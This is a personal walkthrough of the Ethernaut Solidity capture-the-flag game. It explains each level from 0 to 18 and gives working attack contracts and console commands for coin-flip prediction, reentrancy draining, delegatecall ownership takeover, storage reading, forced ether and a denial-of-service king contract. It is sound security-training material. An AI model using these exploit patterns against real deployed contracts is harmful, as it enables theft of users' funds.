# This is a walkthrough of the Ethernaut Solidity CTF.

I did it previously but I want to go through it again and write a detailled walkthrough.

# Levels
## Lvl-0 Hello Ethernaut
Follow the instructions in the console until you get to:
`await contract.method7123949()
'If you know the password, submit it to authenticate().'`.
Remember that you can access to the ABI object with 'contract.abi'.
You will see the 'password' method that you can call:
`'await contract.password()
'ethernaut0'`
Then simply call contract.authenticate() with the param 'ethernaut0', pay for the transaction with metamask,
wait for tx to be mined, click the 'submit instance' button and voila!

## Lvl-1 Fallback
To pass this level, you first need to send some eth to it through the contribute() function, then some more eth through the fallback function.
First check that your contribution is 0, with 'await contract.checkContributions()' that returns 0.
Then call 'await contract.contribute({value: 1})' and pay for the tx.
Wait for the tx to be mined then call 'await contract.checkContributions()' again. It should now be 1.
Now you can send eth through the fallback function with
'await web3.eth.sendTransaction({to: instance, from: player, value: 1})'.
Waited for the tx to be mined and check the owner with 'await contract.owner()'
It should be your address.
You can now call the withdraw function and drain the contract of it's balance.
Call 'await web3.eth.getBalance(instance)' to check that balance is 0.
Click 'submit instance'.

## Lvl-2 Fallout
For this level, you just have to call the 'Fallout()' function with 1 wei and the contract will be yours.
The code comments say that Fallout() is the constructor but that's wrong. Since Solidity v0.4.23, constructors are now specified using the constructor keyword, and since the code is Solidity 0.6, the function Fallout() is not called during deployement and no owner is assigned to the contract.

## Lvl-3 CoinFlip
In order to beat this level, you need to write a smart contract in remix that does the same calcul then the targeted contract and send the guess to the target.
Here is the code:

```
pragma solidity 0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/docs-v3.x/contracts/math/SafeMath.sol';

interface CoinFlip {
    function flip(bool) external;
}

contract Flipper {

    using SafeMath for uint256;

    CoinFlip target = CoinFlip(0xe364E0Cd32846CfbeBfBe21E84611e8467F0E1A4);

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}
```
Then just call the 'attack()' function 10 times (wait some time between each calls to be sure you are not calling the function twice within one block).

## Lvl-4 Telephone
Simply make a contract that calls 'changeOwner()' while passing the msg.sender of your address as the arguments.
```
pragma solidity 0.6.0;
contract Caller {
    Telephone telephone = Telephone(YOUR_INSTANCE_ADD);

    function call() public {
        telephone.changeOwner(msg.sender);
    }
}
```
The tx.origin will be your metamask address, the msg.sender will be your Caller contract, and therefore you will pass the check on the first line of 'changeOwner()'.

## Lvl-5 Token
The first thing you need to notice, in that level, is the abscence of safeMath library. We are dealing with a token from a contract that is not protected by safeMath for overflow and underflow.
The attack is therefore simple.
You just need to use the transfer function to send more than what you have, which will underflow your balance and you will end up with a ridiculous amount of tokens.
Simply use the console to call the transfer() function:
``
await contract.transfer('0xF553874CD699b2285DCcCe8d014e9B0f66eFC63d', 21000000);
``
and click submit.

## Lvl-6 DelegateCall
A quick look at the code shows us that the main contract has a fallback function that delegateCalls another contract.
If we can send a transaction to the main contract with instructions to call the pwn() function, our call will go through to the 'Delegate' contract and execute the pwn() function.
To do this, we need to prepare the payload with by typing in the console: `const payload = web3.eth.abi.encodeFunctionSignature("pwn()")` which is '0xdd365b8b', the 4 first bytes signature of the function 'pwn()', send call the fallback() function with the payload as data of the call: `await contract.sendTransaction({data: payload})`.
Wait for tx to be mined and, voila, you are now the owner of the delegation contract!

## Lvl-7 Force
The contract is empty, therefore the contract has no established way of dealing with ether that are force send to it.
If we add a small balance to a contract, then have it selfdestruct with the targeted contract's address as a parameter, the eth will be force send to the contract and the contract's balance would be > 0.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract SelfDestructor {

    constructor() public payable {
    }
  function kamikaze(address payable _target) public {
      selfdestruct(_target);
  }
}
```

## Lvl-8 Vault
Looking at the code, we can see that the 'bytes32 private password' is not private, at least not private enough.
The key word private means that this variable can only be called by this smart contract. It's doesn't mean that no one can read it.
In the console, I can simply call 'const pass = await web3.eth.getStorageAt(instance, 1)' to get what is being stored in the 2nd memory slot of the instance contract address. I get '0x412076657279207374726f6e67207365637265742070617373776f7264203a29' in response, which is the bytes32 password. I can then call 'contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")' and the vault is unlocked.

## Lvl-9 King
The contract sends the prize to the old king when a new king is being crowned.
So if we claim kingship with a contract that doesn't accept eth payement, the second line of the receive() function, 'king.transfer(msg.value);' will fail. 
```
pragma solidity ^0.6.0;

contract KingForEver {

    function claimKingship(address payable target) payable public {
        target.call.value(1 ether).gas(1000000)("");
    }

    receive() external payable {
        revert();
    }
}
```
And since ethereum transaction are atomic, all of the tx will fail and a new king will never be crowned. We are now king for ever.
Note: had to increase the gas in metamask manually.

## Lvl-10 Reentrancy
This level wants us to perform a reentrancy attack like what happened with the DAO in 2016.
First you have to have you attack smart contract send some eth to create a balance on the targeted contract, then have your attack SC call the withdraw() function of the target and make it so that the fallback() function of the attack SC calls the withdraw() function again, so that the funds are drained before the balance of the attacking SC is reduced.
```
contract ReentrancyAttack {
    Reentrance target;
    uint donationStarter;

    constructor(address payable _target) public payable {
        target = Reentrance(_target);
        donationStarter = msg.value;
        target.donate.value(msg.value)(address(this));
    }

    function reentracyAttack() public {
        target.withdraw(donationStarter);
    }
    // To get your eth back
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    fallback() external payable {
        reentracyAttack();
    }
}
```
## Lvl-11 Elevator
The Elevator contract call the function 'isLastFloor()' of the building contract twice, so we just have to make a contract that sends false the first time isLastFloor() is called and true the second time the function is called and we will have achieve to set the boolean 'top' from the Elevator contract to 'true'
```
pragma solidity 0.6.0;

contract callElevator {

    Elevator elevator;
    bool calledYet = false;

    constructor(address target) public {
        elevator = Elevator(target);
    }

    function reachLastFloor(uint floor) public {
        elevator.goTo(floor);
    }

    function isLastFloor(uint floor) public returns(bool){
        if (!calledYet) {
            calledYet = true;
            return(false);
        }
        else {
            return(true);
        }
    }
}
```

## Lvl-12 Private
The contract has some private variable, but the blockchain is transparent, so we can easily go read those 'private' variables by doing 'await web3.eth.getStorageAt(instance, 5)' in the console which gives us back '0xcaad0e9d0eac5ecbd328a0db25cf5ad437a7cc320739cbdea8e1848c11c4d342', which is the bytes32. But we need the bytes16 version of this so we can make a SC that does
```
contract Convert {
    bytes16 public pass = bytes16(bytes32(0xcaad0e9d0eac5ecbd328a0db25cf5ad437a7cc320739cbdea8e1848c11c4d342));
}
```
to know what the bytes16 version of it is.
Then simply call the unlock() function of the private contract with the bytes16 key and voila, the contract is unlocked.

## Lvl-13 GateKeeper 1
We need to pass 3 checks to open the door.
The first check is easy, just call enter() from a smart contract.
The second check is harder, so we will keep that one for last.
The third check takes a bytes8 as input and has 3 differents checks in it.
    - The easiest is the last one, which checks if "uint32(uint64(_gateKey)) == uint16(tx.origin)", meaning that the byte8 key (0x????????????????) converted to uint64 (all 8 bytes) then converted to uint32 (32 bit of the uint64 of the byte8 key) must be equal to uint16(tx.origin), which is the last 2 bytes of the calling address (0x?????????????!!!!). So, for this check, only the last 2 bytes of the key matter, and they need to be equal to the last 2 bytes of the tx.origin. Since our metamask address is '0x7b8A7924bE6b4102e82880D27499a9AFc08ecDfF', our key, so far, is 0x000000000000cDfF
    - The second check if "uint32(uint64(_gateKey)) != uint64(_gateKey)", which means our key converted to uint64 shouldn't be equal to our key converted to uint32, so one of the 5th, 6th, 7th or 8th byte need to not be null. So now our key is 0x0000000F0000cDfF (changed the 5th byte from the right from 00 to 0F).
    - The 3rd check (the 1st one) checks that uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), meaning that the 3rd and 4th bytes should be 00, which is already the case so our key is 0x0000000F0000cDfF.
To come back to the second check, we need to send a specific amount of gas with the tx so that the gasleft() % 8191 == 0. See https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol.

## Lvl-14 GateKeeper 2
Like the previous level, we need to pass 3 checks.
The first check is the same than the first check from GateKeeper 1, just call enter() from a smart contract, not a EOA.
The second check checks that extcodesize(caller()) is equal to 0, meaning that the caller's code size is null. That's only possible when the call is made from a constructor of a smart contract at the deployement time because the code of the contract doesn't exists yet and therefore is equal to 0. So we just need to call the entre() function from the constructor of our smart contract.
The third check is a A ^ B = C, using the '^' (XOR sign), that does a bit comparaison. So if A ^ B = C, then A = B ^ C, therefore we went from "uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1" to 
uint64(_gateKey) = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ (uint64(0) - 1).
So we just have to call the enter() function with the param bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ (uint64(0) - 1)).
Done.

## Lvl-15 Naught Coin
To pass this level, you need to empty your balance of the ERC20 that the contract gives you. You can't directly transafer them because of the locked time, but you can call the approuve() and the transferFrom() functions and have another address move your coins and empty your balance. Voila!

## Lvl-16 Preservation
This level has a contract calling a lib throught a delegateCall, which are known to create a lot of vulnerabilities.
It's obvious then that the delegateCall is our way to attack this contract.
The delegateCall calls a lib to update the time stored in the lib, in the storage first slot. Since it's a delegateCall, the call is executed in the caller's context, which means that when updating the stored time, the lib actually updates the first slot of memory of the caller contract, which is the Preservation contract.
So, if we deploy an attack library that, when called, updates it's 3rd slot of memory, we could update the 3rd slot of memory of the preservation contract if we delegateCall our attack library. To do so, we need to replace the address of one of the already in place library with the address of our maalicious library. To do so, we call "preservation.setFirstTime(uint(address(attackLib)));" that will update "address public timeZone1Library" to our malicious library, then we call "preservation.setFirstTime()" again and we have our library that updates the 3rd slot of memory and replace the owner of Preservation by our address.


## Lvl-17 Recovery
I used a blockexplorer to find the address and loaded it on remix to call the destroy() function and have the 0.5 eth sent back to me. 
Efficiency is clever laziness.

## Lvl-18 MagicNumber
This level needs us to put together bytecode to solve it.  
I have a deep dive into EVM bytecode on my github, under "bytecode-opcode", for more details.  

So, we need to produce a bytecode of 10 bytes that will return '42'.  
To do this, we need to work backward. In order to return '42', we need to call the 'return' opcode, which is 'f3'.  
The 'return' opcode takes 2 arguments, offset and length. So now we need to push the args. We push 'length' first so it will be in position 2 after we push 'offset'.  
We know we need to return '42', which will sit in a 32 bytes memory slot, so need to return all of the 32 bytes, so 6020 will push arg length 32 bytes to the stack, then '6000' will push '00' on the stack as offset since our '42' will sit on the first memory slot.  
So far, our bytecode is '60206000f3'.  
But, to be able to use memory values, we first need to push those values into the memory.  
In order to do that, we need to use opcode '52' for 'mstore', that takes 2 args, offset and value.  
Again, we push value first, '602a' (push1 value '42' to the stack), '6000', then '52'.  
Our bytecode is now '602a60005260206000f3' which is 10bytes long.  
This is the bytecode of a contract that will return '42' when called. This is our payload:  
Now, we need to complete the bytecode to deploy our payload on the blockchain.  
To do this, we need to work backward again.  
We will have to use the 'codecopy' opcode in order to copy to the blockchain our payload, and the 'return' opcode to signal that we have finished when we set out to do.  
So, again, opcode 'f3', 'return', take 2 args, '600a' because we are returning the 10 bytes of our payload, '6000' because our payload will be sitting in our slot 0 of memory.  
Our bytecode is now '600a6000f3602a60005260206000f3'. Almost there!  
Now we need to use the opcode '39', 'codecopy', that will copy executing contract bytecode to memory, that takes 3 args, destOffset, offset, length. Again, starting backward, length is 10 bytes so '600a', offset is where in the bytecode to start copying, so if we look our bytecode so far '600a60??60??600a600039f3602a60005260206000f3', the part of the bytecode we want to copy start at byte #13 so we want to push value '12' to the stack => '600c', and finaly destOffset is where we want our code copy, which is simply slot 0, so '6000'.
And there we have it, our finalized opcode '600a600c600039600a6000f3602a60005260206000f3'!

From there, we simply have to use the console on Ethernaut to do:  
'var bytecode = "0x600a600c600039600a6000f3602a60005260206000f3"', then  
'web3.eth.sendTransaction({ from: player, data: bytecode }, function(err,res){console.log(res)});'  
that will create a contract on the blockchain.
Then we simply take that contract address and call the solver with it:  
'await contract.setSolver("YourContractAddress")' and voila!

## Lvl19 - AlienCodex